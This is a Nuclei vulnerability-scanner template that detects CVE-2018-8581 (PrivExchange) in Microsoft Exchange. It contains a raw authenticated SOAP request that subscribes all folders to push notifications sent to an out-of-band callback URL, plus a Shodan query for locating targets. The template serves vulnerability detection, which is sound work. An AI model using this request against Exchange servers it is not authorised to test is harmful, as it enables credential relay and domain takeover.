http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - Privilege Escalation (PrivExchange)
  author: princechaddha
  severity: high
  description: |
    Microsoft Exchange Server is vulnerable to a privilege escalation vulnerability (CVE-2018-8581).
    By exploiting this vulnerability, an attacker with a mailbox can impersonate other users, including the domain administrator.
    The vulnerability allows an attacker to subscribe to push notifications that are sent to an attacker-controlled URL.
    This template checks if the Exchange Server accepts a PushSubscriptionRequest and attempts to connect back to the Interactsh server.
    Note: This vulnerability requires valid credentials (even low-privileged ones) to be exploited. Provide them via -u and -p flags or -header 'Authorization: Basic ...'.
  reference:
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://github.com/Ridter/Exchange2domain
    - https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    shodan-query: http.component:"Outlook Web App"
  tags: cve,cve2018,exchange,microsoft,privesc,oast,authenticated

http:
  - raw:
      - |
        POST /ews/exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Accept: text/xml
        User-Agent: ExchangeServicesClient/0.0.0.0
        Translate: F

        <?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
           <soap:Header>
              <t:RequestServerVersion Version="Exchange2013" />
           </soap:Header>
           <soap:Body >
              <m:Subscribe>
                 <m:PushSubscriptionRequest SubscribeToAllFolders="true">
                    <t:EventTypes>
                      <t:EventType>NewMailEvent</t:EventType>
                      <t:EventType>ModifiedEvent</t:EventType>
                      <t:EventType>MovedEvent</t:EventType>
                    </t:EventTypes>
                    <t:StatusFrequency>1</t:StatusFrequency>
                    <t:URL>http://{{interactsh-url}}</t:URL>
                 </m:PushSubscriptionRequest>
              </m:Subscribe>
           </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<m:ResponseCode>NoError</m:ResponseCode>'
          - '<m:SubscribeResponse'
        condition: and

      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
